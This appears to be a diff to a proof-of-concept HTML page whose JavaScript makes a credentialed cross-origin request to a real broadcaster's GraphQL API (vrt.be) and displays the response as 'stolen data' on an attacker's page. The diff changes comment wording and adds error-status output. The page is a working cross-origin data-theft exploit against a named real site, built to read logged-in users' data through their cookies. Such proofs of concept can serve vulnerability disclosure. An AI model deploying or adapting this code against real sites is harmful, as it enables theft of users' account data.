@@ -12,10 +12,10 @@
     </div>
 
     <script>
-        // Create an XMLHttpRequest object to make a request to the victim's site
+        // Create an XMLHttpRequest object to make a request to the vulnerable site
         var xhr = new XMLHttpRequest();
         
-        // Open a GET request to the target URL on the vulnerable site
+        // Open a GET request to the target URL on the victim site
         xhr.open('GET', 'https://www.vrt.be/vrtnu-api/graphql/v1', true);
         
         // Set withCredentials to include cookies and authentication tokens
@@ -30,7 +30,8 @@
                 // Display the stolen data directly on the attacker's site
                 document.getElementById('stolen-data').innerText = stolenData;
             } else {
-                document.getElementById('stolen-data').innerText = 'Failed to fetch data.';
+                document.getElementById('stolen-data').innerText = 
+                    'Failed to fetch data. Status: ' + xhr.status + ' (' + xhr.statusText + ')';
             }
         };
         
@@ -44,3 +45,4 @@
     </script>
 </body>
 </html>
+
